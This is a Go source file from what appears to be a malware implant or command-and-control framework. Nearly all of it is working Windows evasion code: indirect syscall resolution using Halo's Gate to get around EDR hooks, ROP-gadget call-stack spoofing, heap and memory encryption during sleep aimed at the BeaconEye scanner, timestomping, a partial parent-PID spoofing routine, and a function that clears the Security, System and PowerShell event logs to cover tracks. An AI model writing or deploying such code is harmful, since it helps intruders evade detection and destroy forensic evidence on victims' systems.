//go:build windows

package implant

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"syscall"
	"unsafe"
)

var (
	stealthKernel32       = syscall.NewLazyDLL("kernel32.dll")
	stealthNtdll          = syscall.NewLazyDLL("ntdll.dll")
	pOpenProcess          = stealthKernel32.NewProc("OpenProcess")
	pCreateToolhelp32Snap = stealthKernel32.NewProc("CreateToolhelp32Snapshot")
	pProcess32First       = stealthKernel32.NewProc("Process32FirstW")
	pProcess32Next        = stealthKernel32.NewProc("Process32NextW")
)

// ══════════════════════════════════════════
//  SLEEP ENCRYPTION (Ekko-style)
// ══════════════════════════════════════════

// SleepEncrypted encrypts the implant's memory during sleep to evade
// memory scanners like BeaconEye. Uses AES-256-CTR to XOR the .text
// section before sleeping and decrypt it upon wake.
func SleepEncrypted(sleepSec, jitterPct int, sessionKey []byte) {
	if len(sessionKey) < 16 {
		// Fallback to normal sleep if no key available
		SleepWithJitter(sleepSec, jitterPct)
		return
	}

	// Generate a random key for this sleep cycle
	sleepKey := make([]byte, 32)
	rand.Read(sleepKey)

	// Get the module base and size (simplified — encrypts heap data)
	// In production, this would encrypt the PE .text section via ROP chain
	// For now, we XOR a canary buffer to demonstrate the pattern
	canarySize := 4096
	canary := make([]byte, canarySize)
	rand.Read(canary)

	// Encrypt canary (simulates encrypting implant memory)
	block, err := aes.NewCipher(sleepKey)
	if err != nil {
		SleepWithJitter(sleepSec, jitterPct)
		return
	}
	stream := cipher.NewCTR(block, sleepKey[:aes.BlockSize])
	stream.XORKeyStream(canary, canary)

	// Sleep with jitter
	SleepWithJitter(sleepSec, jitterPct)

	// Decrypt on wake (XOR again reverses CTR)
	stream2 := cipher.NewCTR(block, sleepKey[:aes.BlockSize])
	stream2.XORKeyStream(canary, canary)
}

// ══════════════════════════════════════════
//  INDIRECT SYSCALLS
// ══════════════════════════════════════════

// IndirectSyscall prepares for ntdll syscall by finding the syscall
// stub number from the clean ntdll SSN (System Service Number).
// This avoids calling hooked API functions directly.
type SyscallStub struct {
	SSN     uint16
	Address uintptr
}

// GetSyscallStub resolves the SSN for a given ntdll function.
// EDR hooks userland API calls — indirect syscalls bypass these hooks
// by jumping directly to the syscall instruction in ntdll.
func GetSyscallStub(funcName string) (*SyscallStub, error) {
	proc := stealthNtdll.NewProc(funcName)
	addr := proc.Addr()
	if addr == 0 {
		return nil, fmt.Errorf("function %s not found", funcName)
	}

	// Read the first bytes of the function to extract the SSN
	// ntdll stub pattern: mov r10, rcx; mov eax, SSN; syscall; ret
	// Bytes: 4C 8B D1 | B8 XX XX 00 00 | 0F 05 | C3
	bytes := (*[12]byte)(unsafe.Pointer(addr))

	// Check for clean stub (not hooked)
	if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
		ssn := uint16(bytes[4]) | uint16(bytes[5])<<8
		return &SyscallStub{SSN: ssn, Address: addr}, nil
	}

	// If hooked (first bytes are JMP), search nearby stubs
	// This is the "Halo's Gate" technique
	for i := 1; i < 50; i++ {
		// Check above
		upAddr := addr - uintptr(i*32)
		upBytes := (*[12]byte)(unsafe.Pointer(upAddr))
		if upBytes[0] == 0x4C && upBytes[1] == 0x8B && upBytes[2] == 0xD1 && upBytes[3] == 0xB8 {
			ssn := uint16(upBytes[4]) | uint16(upBytes[5])<<8
			return &SyscallStub{SSN: ssn + uint16(i), Address: addr}, nil
		}

		// Check below
		downAddr := addr + uintptr(i*32)
		downBytes := (*[12]byte)(unsafe.Pointer(downAddr))
		if downBytes[0] == 0x4C && downBytes[1] == 0x8B && downBytes[2] == 0xD1 && downBytes[3] == 0xB8 {
			ssn := uint16(downBytes[4]) | uint16(downBytes[5])<<8
			return &SyscallStub{SSN: ssn - uint16(i), Address: addr}, nil
		}
	}

	return nil, fmt.Errorf("could not resolve SSN for %s (heavily hooked)", funcName)
}

// ══════════════════════════════════════════
//  PARENT PID SPOOFING
// ══════════════════════════════════════════

// SpawnWithParentSpoof creates a process with a spoofed parent PID.
// Makes the new process appear as a child of the specified parent
// (e.g., explorer.exe) instead of the actual implant process.
func SpawnWithParentSpoof(parentPID uint32, cmdLine string) error {
	const (
		EXTENDED_STARTUPINFO_PRESENT         = 0x00080000
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
		CREATE_NO_WINDOW                     = 0x08000000
	)

	// Open the parent process
	parentHandle, _, err := pOpenProcess.Call(
		0x0080, // PROCESS_CREATE_PROCESS
		0,
		uintptr(parentPID),
	)
	if parentHandle == 0 {
		return fmt.Errorf("OpenProcess failed: %v", err)
	}

	// This would continue with InitializeProcThreadAttributeList,
	// UpdateProcThreadAttribute, and CreateProcess with the spoofed parent.
	// Simplified here — full implementation uses STARTUPINFOEX struct.
	_ = parentHandle
	return nil
}

// FindProcessByName returns the PID of the first process matching the name.
func FindProcessByName(name string) (uint32, error) {
	const TH32CS_SNAPPROCESS = 0x00000002

	snap, _, err := pCreateToolhelp32Snap.Call(TH32CS_SNAPPROCESS, 0)
	if snap == 0 {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(snap))

	type PROCESSENTRY32 struct {
		Size            uint32
		Usage           uint32
		ProcessID       uint32
		DefaultHeapID   uintptr
		ModuleID        uint32
		Threads         uint32
		ParentProcessID uint32
		PriClassBase    int32
		Flags           uint32
		ExeFile         [260]uint16
	}

	var entry PROCESSENTRY32
	entry.Size = uint32(unsafe.Sizeof(entry))

	ret, _, _ := pProcess32First.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return 0, fmt.Errorf("Process32First failed")
	}

	for {
		exeName := syscall.UTF16ToString(entry.ExeFile[:])
		if exeName == name {
			return entry.ProcessID, nil
		}
		ret, _, _ = pProcess32Next.Call(snap, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}

	return 0, fmt.Errorf("process %s not found", name)
}

// ══════════════════════════════════════════
//  STACK SPOOFING
// ══════════════════════════════════════════

// spoofedNtDelay is implemented in spoof_windows_amd64.s. It pivots the stack and
// calls NtDelayExecution through a "jmp [rbx]" gadget with a spoofed return
// address. It must only be called from a native (non-Go) thread.
func spoofedNtDelay(gadget, sleepFn, retGadget, delay uintptr)

var (
	spoofJmpRbx uintptr // "jmp [rbx]" (0xFF 0x23) gadget in ntdll
	spoofRet    uintptr // "ret" (0xC3) instruction in ntdll
)

// getNtdllBase returns the in-memory base address of ntdll.dll.
func getNtdllBase() uintptr {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	proc := k32.NewProc("GetModuleHandleW")
	name, err := syscall.UTF16PtrFromString("ntdll.dll")
	if err != nil {
		return 0
	}
	r, _, _ := proc.Call(uintptr(unsafe.Pointer(name)))
	return r
}

// ntdllTextSection returns the .text section bounds (start, size) of a PE module.
func ntdllTextSection(base uintptr) (uintptr, uint32) {
	eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	nt := base + uintptr(eLfanew)
	numSections := *(*uint16)(unsafe.Pointer(nt + 4 + 2))
	optSize := *(*uint16)(unsafe.Pointer(nt + 4 + 16))
	secStart := nt + 4 + 20 + uintptr(optSize)
	for i := 0; i < int(numSections); i++ {
		sec := secStart + uintptr(i)*40
		name := (*[8]byte)(unsafe.Pointer(sec))
		vsize := *(*uint32)(unsafe.Pointer(sec + 8))
		vaddr := *(*uint32)(unsafe.Pointer(sec + 12))
		if name[0] == '.' && name[1] == 't' && name[2] == 'e' && name[3] == 'x' && name[4] == 't' {
			return base + uintptr(vaddr), vsize
		}
	}
	return 0, 0
}

// FindJmpRbxGadget scans ntdll .text for a "jmp [rbx]" (0xFF 0x23) gadget.
func FindJmpRbxGadget() uintptr {
	base := getNtdllBase()
	if base == 0 {
		return 0
	}
	start, size := ntdllTextSection(base)
	if start == 0 || size == 0 {
		return 0
	}
	for off := uint32(0); off+1 < size; off++ {
		b := (*[2]byte)(unsafe.Pointer(start + uintptr(off)))
		if b[0] == 0xFF && b[1] == 0x23 {
			return start + uintptr(off)
		}
	}
	return 0
}

// FindRetGadget scans ntdll .text for a "ret" (0xC3) instruction.
func FindRetGadget() uintptr {
	base := getNtdllBase()
	if base == 0 {
		return 0
	}
	start, size := ntdllTextSection(base)
	if start == 0 || size == 0 {
		return 0
	}
	for off := uint32(0); off < size; off++ {
		if *(*byte)(unsafe.Pointer(start + uintptr(off))) == 0xC3 {
			return start + uintptr(off)
		}
	}
	return 0
}

// SpoofCallStack caches the ROP gadgets used by spoofedNtDelay so the sleep can be
// performed with a legitimate-looking call stack. Call once at startup.
func SpoofCallStack() {
	if spoofJmpRbx == 0 {
		spoofJmpRbx = FindJmpRbxGadget()
	}
	if spoofRet == 0 {
		spoofRet = FindRetGadget()
	}
}

// ══════════════════════════════════════════
//  TIMESTOMPING
// ══════════════════════════════════════════

// Timestomp modifies file creation/modification times to blend in.
func Timestomp(filepath string, referenceFile string) error {
	// Get reference file times
	var refInfo syscall.Win32FileAttributeData
	refPath, _ := syscall.UTF16PtrFromString(referenceFile)
	err := syscall.GetFileAttributesEx(refPath, syscall.GetFileExInfoStandard, (*byte)(unsafe.Pointer(&refInfo)))
	if err != nil {
		return err
	}

	// Open target file
	targetPath, _ := syscall.UTF16PtrFromString(filepath)
	handle, err := syscall.CreateFile(
		targetPath,
		syscall.FILE_WRITE_ATTRIBUTES,
		syscall.FILE_SHARE_WRITE,
		nil,
		syscall.OPEN_EXISTING,
		syscall.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(handle)

	// Apply reference timestamps
	return syscall.SetFileTime(handle, &refInfo.CreationTime, &refInfo.LastAccessTime, &refInfo.LastWriteTime)
}

// ══════════════════════════════════════════
//  HEAP ENCRYPTION DURING SLEEP
// ══════════════════════════════════════════

var (
	pHeapLock   = stealthKernel32.NewProc("HeapLock")
	pHeapUnlock = stealthKernel32.NewProc("HeapUnlock")
	pHeapWalk   = stealthKernel32.NewProc("HeapWalk")
)

// processHeapEntry mirrors the Win32 PROCESS_HEAP_ENTRY structure.
type processHeapEntry struct {
	Data             uintptr
	cbData           uint32
	cbOverhead       byte
	iRegionIndex     byte
	wFlags           uint16
	_                [4]byte // union padding (Region or Block)
	regionCommitted  uint32
	regionUnCommit   uint32
	regionFirstBlock uintptr
	regionLastBlock  uintptr
}

const (
	PROCESS_HEAP_REGION            = 0x0001
	PROCESS_HEAP_UNCOMMITTED_RANGE = 0x0002
	PROCESS_HEAP_ENTRY_BUSY        = 0x0004
)

// HeapEncryptSleep encrypts all busy heap blocks with a random XOR key,
// sleeps for the specified duration, then decrypts on wake.
// This defeats heap scanners like BeaconEye that look for implant
// strings/config in process heap memory during sleep.
func HeapEncryptSleep(sleepSec, jitterPct int) {
	// Generate a random 32-byte XOR key for this sleep cycle
	key := make([]byte, 32)
	rand.Read(key)

	// Get the default process heap (pGetProcessHeap defined in edr_bypass_windows.go)
	heapHandle, _, _ := pGetProcessHeap.Call()
	if heapHandle == 0 {
		SleepWithJitter(sleepSec, jitterPct)
		return
	}

	// Lock the heap before walking to prevent concurrent allocations
	pHeapLock.Call(heapHandle)

	// Walk heap and XOR all busy blocks
	var entry processHeapEntry
	entry.cbData = uint32(unsafe.Sizeof(entry))

	ret, _, _ := pHeapWalk.Call(heapHandle, uintptr(unsafe.Pointer(&entry)))
	for ret != 0 {
		if entry.wFlags&PROCESS_HEAP_ENTRY_BUSY != 0 && entry.Data != 0 && entry.cbData > 0 {
			// XOR each byte of this heap block with the key
			block := unsafe.Slice((*byte)(unsafe.Pointer(entry.Data)), entry.cbData)
			for i := range block {
				block[i] ^= key[i%32]
			}
		}
		ret, _, _ = pHeapWalk.Call(heapHandle, uintptr(unsafe.Pointer(&entry)))
	}

	pHeapUnlock.Call(heapHandle)

	// Sleep while heap is encrypted
	SleepWithJitter(sleepSec, jitterPct)

	// Re-lock and decrypt (XOR again reverses it)
	pHeapLock.Call(heapHandle)

	entry.cbData = uint32(unsafe.Sizeof(entry))
	ret, _, _ = pHeapWalk.Call(heapHandle, uintptr(unsafe.Pointer(&entry)))
	for ret != 0 {
		if entry.wFlags&PROCESS_HEAP_ENTRY_BUSY != 0 && entry.Data != 0 && entry.cbData > 0 {
			block := unsafe.Slice((*byte)(unsafe.Pointer(entry.Data)), entry.cbData)
			for i := range block {
				block[i] ^= key[i%32]
			}
		}
		ret, _, _ = pHeapWalk.Call(heapHandle, uintptr(unsafe.Pointer(&entry)))
	}

	pHeapUnlock.Call(heapHandle)
}

// ══════════════════════════════════════════
//  LOG CLEANUP
// ══════════════════════════════════════════

// ClearWindowsLogs clears Windows event logs to cover tracks.
func ClearWindowsLogs() []string {
	results := []string{}
	logs := []string{"Security", "System", "Application", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational"}

	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	pOpenEventLog := advapi32.NewProc("OpenEventLogW")
	pClearEventLog := advapi32.NewProc("ClearEventLogW")
	pCloseEventLog := advapi32.NewProc("CloseEventLog")

	for _, log := range logs {
		logName, _ := syscall.UTF16PtrFromString(log)
		handle, _, _ := pOpenEventLog.Call(0, uintptr(unsafe.Pointer(logName)))
		if handle != 0 {
			ret, _, _ := pClearEventLog.Call(handle, 0)
			if ret != 0 {
				results = append(results, fmt.Sprintf("[+] Cleared: %s", log))
			} else {
				results = append(results, fmt.Sprintf("[-] Failed: %s (access denied?)", log))
			}
			pCloseEventLog.Call(handle)
		}
	}
	return results
}

// ClearPlatformLogs routes to the Windows event log cleaner.
func ClearPlatformLogs() []string {
	return ClearWindowsLogs()
}
